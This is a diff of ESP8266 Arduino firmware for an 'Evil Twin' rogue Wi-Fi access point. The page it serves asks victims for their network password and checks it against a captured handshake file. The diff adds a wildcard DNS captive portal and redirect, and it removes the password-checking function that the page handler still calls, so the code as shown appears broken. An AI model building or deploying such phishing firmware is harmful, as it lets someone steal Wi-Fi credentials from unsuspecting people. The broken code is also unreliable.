@@ -1,28 +1,15 @@
 #include <ESP8266WiFi.h>
 #include <WiFiClient.h>
 #include <ESP8266WebServer.h>
+#include <DNSServer.h>
 #include <SD.h>
 #include <Arduboy2.h>
-
 const char* ssid = "MojaWiFi";  // Názov Evil Twin siete
 const int chipSelect = D8;  // Pin pripojený k CS (Chip Select) na SD kartovom module
 Arduboy2 arduboy;
 
 ESP8266WebServer server(80);
-
-
-// ------------------------------------------
-
-// CONNECTION SD CARD MODULE TO ESP8266
-
-// VCC (SD Card) --> 3.3V 
-// MOSI (SD Card) --> D7
-// MISO (SD Card) --> D6 
-// SCK (SD Card) --> D5
-// CS (SD Card) --> D8
-
-// ------------------------------------------  
-
+DNSServer dnsServer;
 
 void setup() {
   Serial.begin(115200);
@@ -41,7 +28,8 @@ void setup() {
     return;
   }
   Serial.println("SD card mounted");
-
+  // Přidání DNS serveru pro Captive Portal
+  dnsServer.start(53, "*", WiFi.softAPIP());
   // Definícia routy pre webovú stránku
   server.on("/", HTTP_GET, handleRoot);
 
@@ -52,6 +40,8 @@ void setup() {
 
 void loop() {
   server.handleClient();
+  // Obsluha DNS serveru pro Captive Portal
+  dnsServer.processNextRequest();
 }
 
 void handleRoot() {
@@ -64,7 +54,7 @@ void handleRoot() {
   if (crackPassword(password)) {
     message = "Correct password";
   } else {
-    message = "Incorrect password! Please try again.";
+    message = "Incorrect password, please try again.";
   }
 
   // Zobrazenie správy na webovej stránke
@@ -130,21 +120,10 @@ void handleRoot() {
                     </script>\
                   </body>\
                 </html>";
-
-  server.send(200, "text/html", html);
-}
-
-bool crackPassword(String inputPassword) {
-  // Čtení obsahu HandShake.cap souboru
-  File handshakeFile = SD.open("HandShake.cap", FILE_READ);
-  if (handshakeFile) {
-    String handshakeData = handshakeFile.readString();
-    handshakeFile.close();
-
-    // Pokus o prolomení hesla
-    return handshakeData.indexOf(inputPassword) != -1;
-  } else {
-    Serial.println("Error opening HandShake.cap file.");
-    return false;
-  }
+  // Přesměrování pro Captive Portal
+  String redirect = "http://";
+  redirect += WiFi.softAPIP().toString();
+  redirect += "/";
+  server.sendHeader("Location", redirect, true);
+  server.send(302, "text/plain", "");
 }
